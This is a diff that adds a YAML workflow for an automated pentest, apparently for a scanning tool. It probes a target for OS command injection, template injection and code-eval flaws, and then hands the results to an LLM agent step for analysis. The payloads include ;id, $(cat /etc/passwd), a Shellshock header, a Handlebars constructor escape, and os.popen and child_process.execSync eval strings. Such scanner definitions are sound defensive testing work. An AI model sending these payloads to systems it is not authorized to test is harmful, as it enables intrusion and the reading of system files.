@@ -1,0 +1,117 @@
+# Pentest: Code & Command Injection
+# OWASP A03:2021 — RCE, OS Command Injection
+id: pentest_code_injection
+name: Code & Command Injection Test
+version: "1.0.0"
+description: Remote Code Execution (RCE) and OS command injection
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: rce_probes
+    module: http.batch
+    label: RCE Payloads
+    params:
+      description: Test command injection via common input points
+      requests:
+        # OS command injection (Linux)
+        - method: GET
+          url: "{{target_url}}/api/ping?host=127.0.0.1;id"
+        - method: GET
+          url: "{{target_url}}/api/ping?host=127.0.0.1|whoami"
+        - method: GET
+          url: "{{target_url}}/api/ping?host=`id`"
+        - method: GET
+          url: "{{target_url}}/api/ping?host=$(cat /etc/passwd)"
+        # OS command injection (Windows)
+        - method: GET
+          url: "{{target_url}}/api/ping?host=127.0.0.1&dir"
+        # Via headers
+        - method: GET
+          url: "{{target_url}}"
+          headers:
+            User-Agent: "() { :; }; /bin/cat /etc/passwd"
+            Referer: "{{target_url}}/$(id)"
+        # Via file parameter
+        - method: GET
+          url: "{{target_url}}/api/download?file=;id"
+        - method: GET
+          url: "{{target_url}}/api/export?format=pdf|id"
+      detect_patterns:
+        - "uid="
+        - "root:"
+        - "nobody:"
+        - "www-data"
+        - "Volume Serial"
+      measure_time: true
+    orderIndex: 1
+
+  - id: ssti_probes
+    module: http.batch
+    label: Template Injection Probes
+    params:
+      description: Server-Side Template Injection
+      requests:
+        # Jinja2 / Python
+        - method: GET
+          url: "{{target_url}}/api/render?name={{7*7}}"
+        - method: GET
+          url: "{{target_url}}/api/render?name={{config}}"
+        # EJS / Node.js
+        - method: GET
+          url: "{{target_url}}/api/render?name=<%=7*7%>"
+        # Handlebars
+        - method: GET
+          url: "{{target_url}}/api/render?name={{#with 'constructor'}}{{this.constructor('return 1+1')()}}{{/with}}"
+        # FreeMarker / Java
+        - method: GET
+          url: "{{target_url}}/api/render?name=${7*7}"
+      detect_patterns:
+        - "49"
+        - "SECRET_KEY"
+        - "DATABASE_URL"
+    orderIndex: 2
+
+  - id: eval_probes
+    module: http.batch
+    label: Code Eval Probes
+    params:
+      description: Test code evaluation endpoints
+      requests:
+        - method: POST
+          url: "{{target_url}}/api/eval"
+          headers: { "Content-Type": "application/json" }
+          body: '{"expression": "__import__(\"os\").popen(\"id\").read()"}'
+        - method: POST
+          url: "{{target_url}}/api/calculate"
+          headers: { "Content-Type": "application/json" }
+          body: '{"formula": "require(\"child_process\").execSync(\"id\")"}'
+    orderIndex: 3
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze code/command injection test results.
+
+        RCE probes: ${rce_probes.data}
+        SSTI probes: ${ssti_probes.data}
+        Eval probes: ${eval_probes.data}
+
+        Check for: command output in response, template evaluation (49 from 7*7),
+        config/env variable leakage, error messages revealing tech stack.
+
+        Output JSON: { "findings": [...], "severity": "...", "summary": "..." }
+    orderIndex: 4
+
+edges:
+  - { source: start, target: rce_probes }
+  - { source: rce_probes, target: ssti_probes }
+  - { source: ssti_probes, target: eval_probes }
+  - { source: eval_probes, target: analyze }
